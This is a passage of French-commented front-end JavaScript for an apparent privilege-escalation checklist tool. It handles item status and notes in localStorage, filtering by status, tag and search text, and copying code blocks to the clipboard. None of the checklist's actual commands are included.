             const button = target.closest('.copy-btn-inline');
             const pre = button.closest('pre');
             if (pre) {
                 const code = pre.querySelector('code');
                 if (code) {
                     copyToClipboard(code.textContent, button);
                 }
             }
        }
    }

     // --- Mise à jour de l'état d'un item ---
     function updateChecklistItemState(nodeId, itemId, newState) {
         if (!checklistState[nodeId]) {
             checklistState[nodeId] = {};
         }
         if (!checklistState[nodeId][itemId]) {
             checklistState[nodeId][itemId] = { status: 'todo', notes: '' };
         }
         // Fusionner le nouvel état
         checklistState[nodeId][itemId] = { ...checklistState[nodeId][itemId], ...newState };
         saveChecklistStateToStorage(); // Sauvegarder l'état global
         // console.log(`State updated for ${nodeId} - ${itemId}:`, checklistState[nodeId][itemId]);
     }

    // --- Sauvegarde/Chargement de l'État Global ---
    function saveChecklistStateToStorage() {
        try {
            localStorage.setItem(`privescChecklistState_v3`, JSON.stringify(checklistState));
        } catch (e) {
            console.error("Failed to save checklist state to localStorage:", e);
        }
    }

    function loadChecklistStateFromStorage() {
        try {
            const savedState = localStorage.getItem(`privescChecklistState_v3`);
            if (savedState) {
                checklistState = JSON.parse(savedState);
                console.log("Global checklist state loaded from localStorage.");
            } else {
                checklistState = {};
                console.log("No saved global checklist state found.");
            }
        } catch (e) {
            console.error("Failed to load or parse checklist state from localStorage:", e);
            checklistState = {};
        }
    }

    // --- Chargement de l'État pour le Node Actif ---
    function loadChecklistStateForNode(nodeId) {
        const nodeState = checklistState[nodeId];
        if (!nodeState) return;

        console.log(`Loading state for node ${nodeId}`);
        checklistContainer.querySelectorAll('.checklist-item').forEach(itemElement => {
            const itemId = itemElement.dataset.itemId;
            if (nodeState[itemId]) {
                const itemState = nodeState[itemId];
                const statusSelect = itemElement.querySelector('.checklist-status-select');
                const notesTextarea = itemElement.querySelector('.checklist-notes-textarea');

                if (statusSelect) {
                    statusSelect.value = itemState.status || 'todo';
                    // Appliquer la classe de style
                    itemElement.classList.remove('status-checked', 'status-exploitable', 'status-exploited');
                    if (itemState.status && itemState.status !== 'todo') {
                        itemElement.classList.add(`status-${itemState.status}`);
                    }
                }
                if (notesTextarea) {
                    notesTextarea.value = itemState.notes || '';
                }
            }
        });
    }

    // --- Filtrage et Recherche ---
     function populateTagFilter() {
         checklistFilterTag.innerHTML = '<option value="">Tous les tags</option>';
         const sortedTags = Array.from(availableTags).sort();
         sortedTags.forEach(tag => {
             const option = document.createElement('option');
             option.value = tag;
             option.textContent = tag;
             checklistFilterTag.appendChild(option);
         });
     }

    function applyFilters() {
        if (!currentNodeId) return; // Ne pas filtrer si aucun node n'est sélectionné

        const searchTerm = checklistSearchInput.value.toLowerCase().trim();
        const filterStatus = checklistFilterStatus.value;
        const filterTag = checklistFilterTag.value;

        console.log(`Applying filters: Search='${searchTerm}', Status='${filterStatus}', Tag='${filterTag}'`);

        let visibleCount = 0;
        checklistContainer.querySelectorAll('.checklist-item').forEach(itemElement => {
            const itemId = itemElement.dataset.itemId;
            const itemState = checklistState[currentNodeId]?.[itemId] || { status: 'todo' };
            const itemTags = itemElement.dataset.tags.split(',');

            // Vérification Statut
            let statusMatch = true;
            if (filterStatus && itemState.status !== filterStatus) {
                statusMatch = false;
            }

            // Vérification Tag
            let tagMatch = true;
            if (filterTag && !itemTags.includes(filterTag)) {
                tagMatch = false;
            }

            // Vérification Terme de Recherche (dans label, description, commandes, notes)
            let searchMatch = true;
            if (searchTerm) {
                const label = itemElement.querySelector('.checklist-label')?.textContent.toLowerCase() || '';
                const description = itemElement.querySelector('.checklist-description')?.textContent.toLowerCase() || '';
                const checkCmd = itemElement.querySelector('.check-command code')?.textContent.toLowerCase() || '';
                const exploitCmd = itemElement.querySelector('.exploit-command code')?.textContent.toLowerCase() || '';
                const notes = itemElement.querySelector('.checklist-notes-textarea')?.value.toLowerCase() || '';
                searchMatch = label.includes(searchTerm) ||
                              description.includes(searchTerm) ||
                              checkCmd.includes(searchTerm) ||
                              exploitCmd.includes(searchTerm) ||
                              notes.includes(searchTerm);
            }

            // Afficher ou masquer
            if (statusMatch && tagMatch && searchMatch) {
                itemElement.style.display = '';
                visibleCount++;
            } else {
                itemElement.style.display = 'none';
            }
        });
         console.log(`${visibleCount} items visible after filtering.`);
         if (visibleCount === 0 && checklistContainer.children.length > 0) {
              checklistPlaceholder.textContent = 'Aucun item ne correspond aux filtres actuels.';
              checklistPlaceholder.style.display = 'block';
         } else if (checklistContainer.children.length > 0) {
              checklistPlaceholder.style.display = 'none';
         }
    }

    // --- Fonction Copier (Adaptée pour bouton inline) ---
    function copyToClipboard(text, buttonElement) {
        navigator.clipboard.writeText(text).then(() => {
            const originalIcon = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-check text-success"></i>';
            setTimeout(() => {
                buttonElement.innerHTML = originalIcon;
            }, 1500);
        }).catch(err => {
            console.error('Failed to copy text: ', err);
            const originalIcon = buttonElement.innerHTML;
            buttonElement.innerHTML = '<i class="fas fa-times text-danger"></i>';
             setTimeout(() => {
                buttonElement.innerHTML = originalIcon;
            }, 1500);
        });
    }

    // --- Lancement ---
    initialize();

});

// IMPORTANT: Les anciennes fonctions comme parseOutputContent, parseSudoL, parseSuid,
// displayExploitationGuide, renderSuggestions, etc. sont SUPPRIMÉES.
// Toute la logique est maintenant centrée sur la génération et l'interaction
// avec la checklist dynamique basée sur CHECKLIST_DEFINITION et l'état sauvegardé. 